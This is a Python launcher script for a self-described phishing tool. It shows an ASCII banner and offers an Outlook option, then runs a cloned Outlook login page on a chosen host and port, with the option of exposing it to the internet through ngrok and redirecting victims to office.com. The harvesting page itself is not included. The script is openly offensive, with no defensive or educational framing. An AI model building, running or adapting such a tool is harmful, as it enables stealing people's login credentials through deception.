import os
text= """                                                                      
               NN                                                     
             NssdN  N                                                 
             hsym  mmmmNN                                             
             ysym  mmNN  NmmNN                                        
             ysym  mN  NN  mdmmmNN                                    
             ysym  mN  N   mdddddmmmNN                                
          N  ysym   mmNNNmmddddmNNmddmmmN    myyyd                    
      N  Nm  yshm   NmdddddddmmNN  mddddddmN Nd+`/dN                  
     NNNNNN  dhdm    mdddddddN  mN  mdddsssyhmN mo--N                 
       myssh  NN  yN NdddddddN  mmN  mddhsssssydN Nyyhdm              
        my/.:shhs:`N Nmmmmmmm   mmm  NmdddysssssydN No.h              
           Nh+-    y  NNNNNN   NmddN  mdddddysssssymN h:od            
              Ndo-`:NN       NNmmmN   mdddddddhyssshmN m:-N           
                 NdmmmmmNN           Nmddddddddddhyddmm Nhd           
                   NmmmmmmmNNNNNNN  Nmmddddddddddddyyydm  hy          
                    NNNNNNNNNNNN  dmNmmmmmmmmmdddddysshdmN N          
                          NNNNNdy/+m   NNNNN NmdddddhydddmN           
                         m/::--.`y  NN Nhs+/y  mddddddddddm           
                          mdo`   :d d//shmNmN Nddddddddddddm          
                             h-   `sNNhsohN  NmdddddddddddddN         
                              Ns.   -/syyyosN NmmdddddddddddN  N      
                               NNs-   ````` .sm NNmmmdddddddm  +d     
                               ysmNh/`        `/sdN Nmddddddm  :`y    
                               N:.y  my/.`        .s  mdddddm  / `d   
                                NoN     Nhs/.`      ymmdddddm  /` /   
                                             mh-   `-+NNNmddm  -` -   
                                          NmNNNhoohm NN  mddN m`  /   
                                           mmNN  m  m-N Nddm  /` -m   
                                           NN   d/  -o  mdm  d+ohN    
                                             d  +y h d Nmm            
                                            o   /d s`m NN             
                                           m. d yy d`o                
                                         Nh m:/  y  yN                
                                         s:sN hy                      
                         NdN           N                              
                          do/+oossyydm                                
                                                                      
"""
print(text)
windows = False
Mac = False
Linux= False
from sys import platform
if platform == "linux" or platform == "linux2":
    Linux= True
elif platform == "darwin":
    Mac = True
elif platform == "win32":
    Windows= True
print("The one & only up-to-date phishing tool")
print("\n\n")
print("1. Outlook", "blue")
print("\n")
side = int(input("enter option: "))
url = input("Enter url: [https://www.office.com/?auth=2]: ")
if url=="":
    url = "https://www.office.com/?auth=2"

host= input("enter host [127.0.0.1]: ")
if host=="":
    host="127.0.0.1"

port=  input("Enter port [80]")
if port=="":
    port=80
else:
    port=int(port)
ngrok = input("USe ngrok[y/n]: ")

from threading import Thread
def start_ngrok(port):
    os.system(f"ngrok http {port}")



def exec(side):
    if side==1:
        if Linux == True or Mac==True:
            os.system(f"python3 Sites/Linux/Outlook/app.py {url} {host} {port}")

        else:
            os.system(f"clear && python3 Sites\\Windows\\Outlook\\app.py {url} {host} {port}")

b = Thread(target=exec, args=(side, ))
b.start()
if ngrok=="y":
    d=  Thread(target=start_ngrok, args=(port,))
    d.start()
